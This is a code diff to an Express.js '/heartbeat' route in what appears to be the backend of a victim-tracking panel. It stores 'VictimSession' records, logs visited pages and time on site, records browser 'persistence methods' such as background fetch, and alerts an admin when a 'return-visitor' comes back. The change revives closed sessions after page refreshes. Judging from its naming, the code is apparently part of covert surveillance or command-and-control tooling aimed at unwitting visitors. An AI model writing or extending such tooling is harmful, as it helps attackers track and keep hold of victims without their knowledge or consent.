@@ -75,7 +75,21 @@ router.post('/heartbeat', collectionLimiter, async (req, res) => {
   try {
     const { sessionId, timeOnSite } = req.body;
     const session = await VictimSession.findOne({ sessionId });
-    if (!session) return res.status(404).json({ error: 'Session not found' });
+    if (!session) {
+      // If session not found (e.g. manually deleted), client should create a new one
+      return res.status(404).json({ error: 'Session not found' });
+    }
+
+    // === Handle page refresh: mark session back online ===
+    if (req.body.pageRefresh) {
+      session.isOnline = true;
+      session.closedAt = null;
+      // Add current page to URL paths visited
+      const page = req.body.page || '/';
+      if (page && !session.urlPathsVisited.includes(page)) {
+        session.urlPathsVisited.push(page);
+      }
+    }
 
     session.lastActiveAt = new Date();
     if (timeOnSite) session.timeOnSite = timeOnSite;
@@ -93,6 +107,11 @@ router.post('/heartbeat', collectionLimiter, async (req, res) => {
       if (req.body.backgroundTrigger) {
         session.persistenceData.persistenceMethods = [...(session.persistenceData.persistenceMethods || []), 'background-fetch'];
       }
+
+      // Mark session online again if it was closed
+      session.isOnline = true;
+      session.closedAt = null;
+      await session.save();
       
       emitToAdmin('return-visitor', {
         sessionId: session._id,
